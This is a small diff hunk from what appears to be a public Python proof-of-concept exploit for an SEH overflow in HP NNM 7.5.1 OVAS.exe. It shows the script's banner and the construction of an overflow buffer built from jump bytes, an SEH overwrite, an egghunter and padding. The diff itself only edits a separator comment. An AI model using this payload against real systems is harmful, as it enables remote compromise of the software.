@@ -22,7 +22,7 @@ import sys
 print "[*] HP NNM 7.5.1 OVAS.exe SEH Overflow Exploit (0day)"
 print "[*] http://www.offensive-security.com"
 
----
+# --- #
 
 evilcrash = "\xeb"*1101 + "\x41\x41\x41\x41\x77\x21\x6e\x6c\x35\x6d" + "G"*32 +egghunter + "A"*100 + ":7510"
 
